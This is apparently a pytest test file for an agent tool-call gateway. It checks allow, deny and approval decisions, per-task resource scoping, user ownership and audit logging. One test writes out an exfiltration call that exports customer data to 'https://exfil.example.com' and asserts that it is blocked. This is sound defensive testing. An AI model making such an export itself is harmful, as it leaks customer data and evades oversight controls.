"""Gateway enforcement tests: ensure blocked actions never execute and that
every evaluation produces an audit record."""
from __future__ import annotations

from app.core.enums import Decision, ExecutionStatus
from app.schemas.models import TaskCreate, ToolCall
from app.services import gateway_service, task_service
from app.services.audit_service import list_events

USER = "user-demo-001"


def _make_task(db, template_id):
    return task_service.create_task(
        db, TaskCreate(template_id=template_id, original_request=""), user_id=USER
    )


def test_allowed_call_executes_and_returns_result(db):
    task = _make_task(db, "summarize_q3_report")
    call = ToolCall(tool="read_report", operation="read", resource="sales_report_Q3")
    resp = gateway_service.evaluate_and_execute(db, task_id=task.id, call=call)
    assert resp.decision == Decision.ALLOW
    assert resp.execution_status == ExecutionStatus.EXECUTED
    assert resp.result is not None and "content" in resp.result


def test_denied_call_never_executes(db):
    task = _make_task(db, "summarize_q3_report")
    call = ToolCall(tool="export_customers", operation="export", resource=None,
                    arguments={"destination": "https://exfil.example.com"})
    resp = gateway_service.evaluate_and_execute(db, task_id=task.id, call=call)
    assert resp.decision == Decision.DENY
    assert resp.execution_status == ExecutionStatus.BLOCKED
    assert resp.result is None  # executor was never invoked


def test_requires_approval_does_not_execute(db):
    task = _make_task(db, "approved_customer_export")
    call = ToolCall(tool="export_customers", operation="export", resource=None,
                    arguments={"destination": "APPROVED_INTERNAL_VAULT"})
    resp = gateway_service.evaluate_and_execute(db, task_id=task.id, call=call)
    assert resp.decision == Decision.REQUIRES_APPROVAL
    assert resp.execution_status == ExecutionStatus.BLOCKED
    assert resp.result is None


def test_missing_task_denies(db):
    call = ToolCall(tool="read_report", operation="read", resource="sales_report_Q3")
    resp = gateway_service.evaluate_and_execute(db, task_id="does-not-exist", call=call)
    assert resp.decision == Decision.DENY
    assert resp.execution_status == ExecutionStatus.BLOCKED


def test_evaluation_writes_audit_event(db):
    task = _make_task(db, "summarize_q3_report")
    call = ToolCall(tool="read_report", operation="read", resource="sales_report_Q3")
    resp = gateway_service.evaluate_and_execute(db, task_id=task.id, call=call)
    events = list_events(db)
    assert any(e.id == resp.audit_event_id for e in events)
    ev = next(e for e in events if e.id == resp.audit_event_id)
    assert ev.decision == Decision.ALLOW
    assert ev.correlation_id == resp.correlation_id


def test_execute_false_does_not_run_executor(db):
    task = _make_task(db, "summarize_q3_report")
    call = ToolCall(tool="read_report", operation="read", resource="sales_report_Q3")
    resp = gateway_service.evaluate_and_execute(db, task_id=task.id, call=call, execute=False)
    assert resp.decision == Decision.ALLOW
    assert resp.execution_status == ExecutionStatus.NOT_EXECUTED
    assert resp.result is None


def test_cross_resource_blocked(db):
    task = _make_task(db, "summarize_q3_report")  # authorized for Q3 only
    call = ToolCall(tool="read_report", operation="read", resource="sales_report_Q2")
    resp = gateway_service.evaluate_and_execute(db, task_id=task.id, call=call)
    assert resp.decision == Decision.DENY
    assert resp.execution_status == ExecutionStatus.BLOCKED


def test_ownership_enforced_by_gateway(db):
    task = _make_task(db, "summarize_q3_report")
    call = ToolCall(tool="read_report", operation="read", resource="sales_report_Q3")
    resp = gateway_service.evaluate_and_execute(
        db, task_id=task.id, call=call, caller_user_id="attacker"
    )
    assert resp.decision == Decision.DENY
    assert resp.execution_status == ExecutionStatus.BLOCKED
